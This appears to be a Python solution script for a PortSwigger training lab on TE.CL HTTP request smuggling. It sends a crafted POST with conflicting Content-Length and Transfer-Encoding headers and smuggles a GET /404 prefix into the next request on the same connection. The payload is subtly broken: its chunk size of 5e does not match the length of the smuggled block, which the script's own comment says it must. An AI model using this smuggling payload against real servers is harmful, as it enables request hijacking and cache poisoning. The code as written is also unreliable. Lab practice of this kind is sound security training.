"""
Lab 5: Confirming a TE.CL vulnerability via differential responses
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-tecl-via-differential-responses
Difficulty: Practitioner

📝 Mirror of Lab 4 for the TE.CL case, same-connection version.
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
GET /404 HTTP/1.1
X-Ignore: X
0

""".format(host=HOST))

NORMAL_FOLLOWUP = normalize_crlf("""GET / HTTP/1.1
Host: {host}

""".format(host=HOST))


def run():
    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, NORMAL_FOLLOWUP])
    summarize_response(r1, "Smuggle request response")
    summarize_response(r2, "Follow-up GET / response")

    if b" 404 " in r2.split(b"\r\n", 1)[0]:
        log("Confirmed: follow-up request came back 404 — smuggled prefix landed.")
    else:
        note("No 404 shift seen — the chunk-size hex value (5e) must exactly")
        note("match the byte length of the smuggled GET block; recount if needed.")


if __name__ == "__main__":
    run()
